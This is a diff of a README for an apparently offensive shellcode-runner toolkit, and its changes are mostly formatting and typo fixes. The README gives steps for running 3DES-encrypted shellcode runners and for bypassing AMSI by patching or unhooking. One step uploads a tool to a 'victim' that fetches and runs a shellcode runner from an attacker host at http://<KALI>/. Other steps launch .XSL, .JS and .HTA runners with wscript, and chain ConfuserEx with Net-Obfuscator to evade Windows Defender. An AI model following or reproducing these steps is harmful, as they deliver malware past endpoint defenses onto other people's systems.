@@ -23,9 +23,10 @@ When payload is generated with name shellcode_runner_assembly_FlsAlloc_marshal.e
 - FlsAlloc API was used
 - The Shellcode will be injected to executable's address space (Not to a remote process).
 
-### Execution
+### Payload execution
 
-[+] Triple DES [+]
+**[+] Triple DES [+]**
+
 The 3DES payloads are located under payloads/3DES/ directory. There are two payloads and need to be executed diferrently. 
 
 #### Method 1
@@ -36,7 +37,7 @@ The executable **des_decryptor.exe** is downloading the file from your Web serve
 The executable embedds a shellcode runner. You can run it without providing any commands. 
 ```cmd> des_decryptor_embedded.exe```
 
-[+] AMSI Bypass [+]
+**[+] AMSI Bypass [+]**
 There are two methods to bypass AMSI:
 - Patching 
 - Unhooking
@@ -60,7 +61,8 @@ To unhook AMSI, I've used the project by jfmaes - AmsiHooker (https://github.com
 1. Upload unhook_amsi.exe and MinHook.NET.dll to victim. (Files located under payloads/AMSI/)
 2. unhook_amsi.exe http://<KALI>/shellcode_runner.exe
 
-[+] Executing .XSL, .JS, .HTA [+]
+**[+] Executing .XSL, .JS, .HTA [+]**
+
 Under directory payloads/DotNetToJScript/, you find three shellcode ruuners that generated with DotNetToJScript (https://github.com/tyranid/DotNetToJScript). 
 
 Executing .XSL shellcode runner
@@ -79,11 +81,12 @@ Executing .JS shellcode runner
 wscript c:\users\public\shellcode_runner.js
 ```
 
-More execution mehtods can be found:
+More execution methods can be found:
 - https://lolbas-project.github.io/
 
 
-[+] ConfuserX + Net-Obfuscator [+]
+**[+] ConfuserX + Net-Obfuscator [+]**
+
 During my tests, I noticed that Windows Defender could detect my payloads genereted by ConfuserEx (https://github.com/yck1509/ConfuserEx). For this reason, I combined ConfuserEx + Net-Obfuscator (https://github.com/BinaryScary/NET-Obfuscate). 
 
 First, payloads that are located under payloads/XOR/ and payloads/Caesar/ directories, feed the ConfuserEx tool and subsequently the new obfuscated binaries are imported to Net-Obfuscator. As a result, the GetType and GetMethod values are obfuscated and  dynamically created.
